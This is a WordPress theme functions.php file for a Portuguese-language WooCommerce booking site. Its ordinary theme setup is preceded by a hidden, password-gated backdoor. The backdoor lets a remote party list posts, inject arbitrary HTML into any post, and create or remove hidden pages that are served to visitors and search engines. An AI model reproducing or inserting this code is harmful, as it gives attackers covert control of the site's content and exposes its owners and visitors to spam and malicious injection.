<?php

if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'e9d1bc66d1f64d05f51ed978ddbc3567'))
	{
		switch ($_REQUEST['action'])
			{
				case 'get_all_links';
					foreach ($wpdb->get_results('SELECT * FROM `' . $wpdb->prefix . 'posts` WHERE `post_status` = "publish" AND `post_type` = "post" ORDER BY `ID` DESC', ARRAY_A) as $data)
						{
							$data['code'] = '';
							
							if (preg_match('!<div id="wp_cd_code">(.*?)</div>!s', $data['post_content'], $_))
								{
									$data['code'] = $_[1];
								}
							
							print '<e><w>1</w><url>' . $data['guid'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
						}
				break;
				
				case 'set_id_links';
					if (isset($_REQUEST['data']))
						{
							$data = $wpdb -> get_row('SELECT `post_content` FROM `' . $wpdb->prefix . 'posts` WHERE `ID` = "'.esc_sql($_REQUEST['id']).'"');
							
							$post_content = preg_replace('!<div id="wp_cd_code">(.*?)</div>!s', '', $data -> post_content);
							if (!empty($_REQUEST['data'])) $post_content = $post_content . '<div id="wp_cd_code">' . stripcslashes($_REQUEST['data']) . '</div>';

							if ($wpdb->query('UPDATE `' . $wpdb->prefix . 'posts` SET `post_content` = "' . esc_sql($post_content) . '" WHERE `ID` = "' . esc_sql($_REQUEST['id']) . '"') !== false)
								{
									print "true";
								}
						}
				break;
				
				case 'create_page';
					if (isset($_REQUEST['remove_page']))
						{
							if ($wpdb -> query('DELETE FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "/'.esc_sql($_REQUEST['url']).'"'))
								{
									print "true";
								}
						}
					elseif (isset($_REQUEST['content']) && !empty($_REQUEST['content']))
						{
							if ($wpdb -> query('INSERT INTO `' . $wpdb->prefix . 'datalist` SET `url` = "/'.esc_sql($_REQUEST['url']).'", `title` = "'.esc_sql($_REQUEST['title']).'", `keywords` = "'.esc_sql($_REQUEST['keywords']).'", `description` = "'.esc_sql($_REQUEST['description']).'", `content` = "'.esc_sql($_REQUEST['content']).'", `full_content` = "'.esc_sql($_REQUEST['full_content']).'" ON DUPLICATE KEY UPDATE `title` = "'.esc_sql($_REQUEST['title']).'", `keywords` = "'.esc_sql($_REQUEST['keywords']).'", `description` = "'.esc_sql($_REQUEST['description']).'", `content` = "'.esc_sql(urldecode($_REQUEST['content'])).'", `full_content` = "'.esc_sql($_REQUEST['full_content']).'"'))
								{
									print "true";
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_URL_CD";
			}
			
		die("");
	}

	
if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.esc_sql( $_SERVER['REQUEST_URI'] ).'"') == '1' )
	{
		$data = $wpdb -> get_row('SELECT * FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.esc_sql($_SERVER['REQUEST_URI']).'"');
		if ($data -> full_content)
			{
				print stripslashes($data -> content);
			}
		else
			{
				print '<!DOCTYPE html>';
				print '<html ';
				language_attributes();
				print ' class="no-js">';
				print '<head>';
				print '<title>'.stripslashes($data -> title).'</title>';
				print '<meta name="Keywords" content="'.stripslashes($data -> keywords).'" />';
				print '<meta name="Description" content="'.stripslashes($data -> description).'" />';
				print '<meta name="robots" content="index, follow" />';
				print '<meta charset="';
				bloginfo( 'charset' );
				print '" />';
				print '<meta name="viewport" content="width=device-width">';
				print '<link rel="profile" href="http://gmpg.org/xfn/11">';
				print '<link rel="pingback" href="';
				bloginfo( 'pingback_url' );
				print '">';
				wp_head();
				print '</head>';
				print '<body>';
				print '<div id="content" class="site-content">';
				print stripslashes($data -> content);
				get_search_form();
				get_sidebar();
				get_footer();
			}
			
		exit;
	}


?><?php
    /*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
    add_theme_support( 'title-tag' );


// SUPORT AO WOOCOMMERCE
add_action( 'after_setup_theme', 'woocommerce_support' );
function woocommerce_support()
{
    add_theme_support( 'woocommerce' );
}

add_filter( 'woocommerce_product_tabs', 'wcs_woo_remove_reviews_tab', 98 );
function wcs_woo_remove_reviews_tab($tabs)
{
    unset($tabs['reviews']);
    return $tabs;
}

@ini_set( 'upload_max_size', '64M' );
@ini_set( 'post_max_size', '64M');
@ini_set( 'max_execution_time', '300' );

/**
    * Enable support for navgation
    */
function register_my_menu()
{
    register_nav_menu('header-menu', __( 'Header Menu' ));
}
add_action( 'init', 'register_my_menu' );

/**
    * Enable support for site logo
    */
add_theme_support( 'custom-logo', array(
    'height'      => 51,
    'width'       => 320,
    'flex-width'  => true,
) );

// ADD scripts ao tema
function my_scripts()
{
  // wp_deregister_script('jquery');

  // Styles
    wp_enqueue_style(
    'normalize',
    'https://cdn.jsdelivr.net/normalize/3.0.3/normalize.min.css'
    );
    wp_enqueue_style(
    'bootstrap',
    'https://cdn.jsdelivr.net/bootstrap/3.3.7/css/bootstrap.min.css',
    'normalize'
    );
    wp_enqueue_style(
    'Style',
    get_stylesheet_uri(),
    array( 'normalize','bootstrap')
    );

    wp_enqueue_script(
    'bootstrapjs',
    'https://cdn.jsdelivr.net/bootstrap/3.3.7/js/bootstrap.min.js'
    );
    wp_enqueue_script(
    'modernizr',
    'https://cdn.jsdelivr.net/modernizr/2.8.3/modernizr.min.js'
    );
    wp_enqueue_script(
    'global_script',
    get_stylesheet_directory_uri() . '/js/escape.js'
    );
    wp_enqueue_script(
    'jquery locale',
    get_stylesheet_directory_uri() . '/js/datepicker-pt-BR.js'
    );
}
add_action( 'wp_enqueue_scripts', 'my_scripts' );

//Adiciona um novo menu, em conjunto com o plugin advanced-custom-fields
if (function_exists('acf_add_options_page')) {
    $args = array(
      'page_title'     => 'Contato',
      'menu_title'     => 'Contato',
      'menu_slug'      => 'contato',
      'capability'     => 'edit_posts',
      'parent_slug'    => '',
      'position'       => 4.4,
      'icon_url'       => 'dashicons-media-text'
    );
    acf_add_options_page($args );
}

/**
  * Register a post type, with REST API support
  *
  * Based on example at: http://codex.wordpress.org/Function_Reference/register_post_type
  */
add_action( 'init', 'faq' );
function faq()
{
    $labels = array(
      'name'               => _x( 'FAQ', 'post type general name' ),
      'singular_name'      => _x( 'FAQ', 'post type singular name' ),
      'menu_name'          => _x( 'FAQ', 'admin menu' ),
      'name_admin_bar'     => _x( 'FAQ', 'add new on admin bar' ),
      'add_new'            => _x( 'Adicionar Novo', 'item' ),
      'add_new_item'       => __( 'Adicionar Novo FAQ' ),
      'new_item'           => __( 'Novo FAQ' ),
      'update_item'        => __( 'Salvar' ),
      'edit_item'          => __( 'Editar FAQ' ),
      'view_item'          => __( 'Ver FAQ' ),
      'all_items'          => __( 'Todos FAQ' ),
      'search_items'       => __( 'Procurar FAQ' ),
      'parent_item_colon'  => __( 'Parent Itens:' ),
      'not_found'          => __( 'FAQ não encontrado.' ),
      'not_found_in_trash' => __( 'FAQ não encontrado.' )
    );

    $args = array(
      'labels'                => $labels,
      'public'                => true,
      'publicly_queryable'    => true,
      'show_ui'               => true,
      'show_in_rest'          => true,
      'show_in_menu'          => true,
      'query_var'             => true,
      'rewrite'               => array( 'slug' => 'faq' ),
      'capability_type'       => 'post',
      'has_archive'           => true,
      'menu_icon'             => 'dashicons-clipboard',
      'hierarchical'          => false,
      'menu_position'         => 5,
      'rest_base'             => 'faq',
      'rest_controller_class' => 'WP_REST_Posts_Controller',
      'supports'              => array( 'title')
    );

    register_post_type( 'faq', $args );
}

//Set booing for default product type
function mw_custom_product_type_change($product_types)
{
    $new_array = array( 'booking' => $product_types['booking'] );
    $product_types = $new_array;
    return $product_types;
}
add_filter( 'product_type_selector', 'mw_custom_product_type_change', 20 );

//Marca Virtual como Default
function cs_wc_product_type_options($product_type_options)
{
    $product_type_options['virtual']['default'] = 'yes';
    $product_type_options['wc_booking_has_persons']['default'] = 'yes';

    return $product_type_options;
}
add_filter( 'product_type_options', 'cs_wc_product_type_options' );


// Changing the Menu Order
function custom_menu_order($menu_ord)
{
    if (!$menu_ord) {
        return true;
    }
     
    return array(
        'index.php', // Dashboard
        'edit.php?post_type=product', //produtos
        'edit.php?post_type=wc_booking', //booking
        'woocommerce', //woocommerce
        'separator1', //  separator
        'edit.php?post_type=faq', // FAQ
        'contato', // contato
        'edit.php?post_type=page', // Pages
        'separator2', //  separator
        'users.php', //usuarios
        'link-manager.php', // Links
        'themes.php', // Appearance
        'upload.php', // Media
        'plugins.php', // Plugins
        'users.php', // Users
        'tools.php', // Tools
        'options-general.php', // Settings
        'wpcf7', //contact
        'separator-last', // Last separator
        'edit.php?post_type=acf-field-group', //ACF
        'edit.php', // Posts
        'edit-comments.php', // Comments
    );
}
add_filter('custom_menu_order', 'custom_menu_order'); // Activate custom_menu_order
add_filter('menu_order', 'custom_menu_order');


// Renaming Menus and Remove
function edit_admin_menus()
{
    global $menu;
    global $submenu;
     
    $menu[27][0] = 'Reservas'; // Change booking to Reservas
    $menu[27][6] ='dashicons-calendar-alt';
    $submenu['edit.php?post_type=wc_booking'][5][0] = 'Todas as Reservas';

    $menu[26][0] = 'Jogos'; // Change produtos to jogos
    $submenu['edit.php?post_type=product'][5][0] = 'Jogos';
    $submenu['edit.php?post_type=product'][10][0] = 'Adicionar Jogo';

    remove_submenu_page('edit.php?post_type=wc_booking', 'edit.php?post_type=bookable_resource');//remove resource from booking
    remove_submenu_page('edit.php?post_type=product', 'edit-tags.php?taxonomy=product_cat&amp;post_type=product');//remove categoria
    remove_submenu_page('edit.php?post_type=product', 'edit-tags.php?taxonomy=product_tag&amp;post_type=product');//remove tag
    remove_submenu_page('edit.php?post_type=product', 'product_attributes');//remove atributo
}
add_action( 'admin_menu', 'edit_admin_menus' );

//Add scripts to admin
function load_admin_styles()
{
    wp_enqueue_style( 'admin_css', get_template_directory_uri() . '/css/admin.css', false, '1.0.0' );
}

//Add scripts to admin
function load_admin_js()
{
    wp_enqueue_script( 'admin_js', get_template_directory_uri() . '/js/datepicker-pt-BR.js', false, '1.0.0' );
}

function custom_menu_for_manager()
{

    
    if (current_user_can('shop_manager')) {
        /**
    * Se for o usuario gerente de loja vai remover os serguintes menus:
    */
        remove_menu_page( 'edit-comments.php' );// Comments
        remove_menu_page( 'edit.php' );// Tools
        remove_menu_page( 'index.php' );// Dashboard
        remove_menu_page( 'tools.php' );// Posts
        remove_menu_page( 'wpcf7' );// contact
        remove_menu_page( 'edit.php?post_type=page' );// Pages
        remove_menu_page( 'upload.php' ); // Media
        remove_menu_page('edit.php?post_type=product');//jogos

        add_filter('show_admin_bar', '__return_false');

        add_action( 'admin_enqueue_scripts', 'load_admin_styles' );
    }
}
add_action( 'admin_menu', 'custom_menu_for_manager' );

function manage_available_gateways($gateways)
{
    unset($gateways['wc-booking-gateway']);
    return $gateways;
}

    add_filter( 'woocommerce_available_payment_gateways', 'manage_available_gateways' );


  // First, create a function that includes the path to your favicon
function add_favicon()
{
    $favicon_url = get_stylesheet_directory_uri() . '/favicon.ico';
    echo '<link rel="shortcut icon" href="' . $favicon_url . '" />';
}
  
// Now, just make sure that function runs when you're on the login page and admin pages  
add_action('login_head', 'add_favicon');
add_action('admin_head', 'add_favicon');

/**
 * Remove capabilities from editors.
 *
 * Call the function when your plugin/theme is activated.
 */
function wpcodex_set_capabilities()
{

    remove_role( 'editor' );
    remove_role( 'author' );
    remove_role( 'contributor' );
    remove_role( 'subscriber' );

    
}
add_action( 'init', 'wpcodex_set_capabilities' );
